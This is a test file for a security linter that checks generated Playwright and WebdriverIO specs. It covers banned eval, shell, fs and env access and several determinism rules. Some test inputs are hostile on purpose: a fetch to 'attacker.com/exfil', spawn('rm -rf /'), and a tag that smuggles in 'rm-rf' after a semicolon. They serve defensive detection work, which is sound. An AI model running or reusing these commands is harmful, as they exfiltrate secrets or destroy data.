import { test } from 'node:test'
import assert from 'node:assert/strict'
import { writeFileSync, mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { execSync } from 'node:child_process'

const BIN = new URL('../bin/ast-lint.mjs', import.meta.url).pathname

function lint(content, ext = 'spec.ts', cfg = { allowedOrigins: ['http://localhost:3000'] }) {
  const dir = mkdtempSync(join(tmpdir(), 'astlint-'))
  const file = join(dir, `t.${ext}`)
  writeFileSync(file, content)
  const cfgFile = join(dir, 'cfg.json')
  writeFileSync(cfgFile, JSON.stringify(cfg))
  try {
    const out = execSync(`node ${BIN} ${file} ${cfgFile}`, { encoding: 'utf8' })
    return { ok: true, out }
  } catch (e) {
    return { ok: false, out: e.stdout?.toString() || '', err: e.stderr?.toString() || '' }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

test('clean playwright file passes', () => {
  const r = lint(`
import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test('ok', async ({ page }) => {
  await page.goto('http://localhost:3000/foo')
  await page.getByRole('button', { name: /submit/i }).click()
  await expect(page.getByRole('alert')).toBeVisible()
})
`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('eval is banned', () => {
  const r = lint(`eval("alert(1)")`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-dynamic-eval/)
})

test('page.evaluate template-literal banned', () => {
  const r = lint('import { test } from "@playwright/test"\ntest("x", async ({ page }) => { await page.evaluate(`alert(${1})`) })')
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-eval-via-page/)
})

test('child_process import banned', () => {
  const r = lint(`import { spawn } from 'child_process'`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-shell/)
})

test('process.env direct read banned', () => {
  const r = lint(`const t = process.env.SECRET_TOKEN`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-raw-env/)
})

test('cross-origin fetch banned', () => {
  const r = lint(`await fetch('https://attacker.com/exfil')`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-cross-origin-fetch/)
})

test('css selector banned', () => {
  const r = lint(`import { test } from "@playwright/test"\ntest('x', async ({ page }) => { await page.locator('.btn-primary').click() })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /selector-policy/)
})

test('getByText exact-string banned (regex form required)', () => {
  const r = lint(`import { test } from "@playwright/test"\ntest('x', async ({ page }) => { await page.getByText('Save').click() })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /selector-policy/)
})

test('getByText regex form passes', () => {
  const r = lint(`import { test, expect } from "@playwright/test"\ntest.describe.configure({ mode: 'parallel' })\ntest('x', async ({ page }) => { await page.getByText(/save|uložit/i).click() })`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('fs import is banned', () => {
  const r = lint(`import fs from 'node:fs'`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-fs/)
})

test('browser_run_code_unsafe is banned', () => {
  const r = lint(`await browser_run_code_unsafe({ code: 'alert(1)' })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-unsafe-mcp/)
})

test('tag with shell chars is banned', () => {
  const r = lint(`import { test } from "@playwright/test"\ntest('x', { tag: ['@a;rm-rf', '@b'] }, async () => {})`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-tag-shell-chars/)
})

test('file with // header comment + bare spawn still triggers no-shell (C1 regression)', () => {
  const r = lint(`/*
SWEEP-ID: 2026-05-13-1200
FINDING-ID: F-2026-05-13-0001
*/
// AUTO-GENERATED-EXTEND BY /e2e
import { test } from '@playwright/test'
test('x', async () => { spawn('rm -rf /') })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-shell/)
})

// ─── Determinism rules (references/assertions.md) ───

test('require-isolation-metadata: Playwright spec without parallel-mode declaration is rejected', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test('x', async ({ page }) => { await expect(page.getByRole('button', { name: /go/i })).toBeVisible() })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /require-isolation-metadata/)
})

test('require-isolation-metadata: INDEPENDENT: false header waives the check', () => {
  const r = lint(`/*
SWEEP-ID: 2026-05-13-1200
FINDING-ID: F-2026-05-13-0042
INDEPENDENT: false
DEFERRED-REASON: cleanup-impossible-third-party-billing
*/
import { test, expect } from '@playwright/test'
test.fixme('x', async ({ page }) => { await expect(page.getByRole('button', { name: /go/i })).toBeVisible() })`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('require-isolation-metadata: WDIO spec accepts runner isolation header', () => {
  const r = lint(`/*
SWEEP-ID: 2026-05-13-1200
FINDING-ID: F-2026-05-13-0043
INDEPENDENT: true
RUNNER-ISOLATED: true
*/
describe('mobile', () => {
  it('shows home', async () => { await $('~screen-home').waitForDisplayed() })
})`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('no-test-serial: test.describe.serial is banned', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test.describe.serial('flow', () => { test('a', async () => {}); test('b', async () => {}) })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-test-serial/)
})

test('no-test-serial: chained .serial() on describe is banned', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test.describe('flow', () => {}).serial(() => { test('a', async () => {}) })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-test-serial/)
})

test('no-test-serial: .serialize( does NOT false-positive', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test('x', async ({ page }) => { const x = JSON.stringify({ a: 1 }); const y = obj.serialize(); await expect(page.getByRole('button', { name: /go/i })).toBeVisible() })`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('no-shared-mutable-module-state: top-level let is banned', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
let createdId = ''
test('x', async ({ page }) => { createdId = 'foo'; await expect(page.getByRole('button', { name: /go/i })).toBeVisible() })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-shared-mutable-module-state/)
})

test('no-shared-mutable-module-state: top-level const is allowed', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
const FIXED = 'sweep-F-2026-05-13-0001-customer'
test('x', async ({ page }) => { await expect(page.getByText(new RegExp(FIXED))).toBeVisible() })`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('no-shared-mutable-module-state: let inside a test() body is allowed', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test('x', async ({ page }) => {
  let captured = ''
  captured = await page.getByRole('textbox', { name: /id/i }).inputValue()
  await expect(page.getByText(new RegExp(captured))).toBeVisible()
})`)
  assert.equal(r.ok, true, r.out + r.err)
})
